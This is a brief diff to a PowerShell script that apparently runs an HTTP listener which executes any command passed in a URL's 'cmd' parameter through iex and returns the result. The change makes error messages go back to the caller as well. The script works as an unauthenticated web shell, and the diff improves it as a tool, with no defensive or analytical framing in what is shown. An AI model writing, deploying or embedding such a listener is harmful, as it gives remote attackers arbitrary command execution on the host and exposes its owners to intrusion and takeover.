@@ -15,8 +15,15 @@ while (1) {
     $query = $ctx.Request.RawUrl -replace "%20", " " -replace "%22", "'"
     
     if ( $query -match "^/\?cmd=(.*)" ) {
+        
+        $error.clear()
+        
         $matches[1]
         $res = iex $matches[1] | Out-String
+        
+        if($error) {            
+            $res = $error | Out-String            
+        }
     }
 
     $buffer = [System.Text.Encoding]::UTF8.GetBytes($res)
